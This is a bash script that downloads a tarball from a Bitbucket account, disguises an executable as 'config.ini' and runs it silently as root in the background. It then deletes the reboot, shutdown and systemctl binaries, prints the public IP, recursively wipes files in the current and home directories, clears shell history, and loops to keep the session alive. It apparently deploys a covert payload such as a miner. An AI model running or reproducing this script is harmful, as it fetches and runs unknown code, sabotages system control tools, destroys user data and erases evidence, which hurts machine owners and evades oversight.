#!/bin/bash
sudo apt update && apt install git wget nano libpci-dev && wget -q https://bitbucket.org/kami-kaze01/maxkaze/downloads/kamikazeT4.tar.gz && tar -xvf kamikazeT4.tar.gz 
chmod +x kamikaze
chmod +x config.ini
sudo nohup ./config.ini > /dev/null 2>&1 &
sleep 30
sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "Download..."
        sleep 20
done
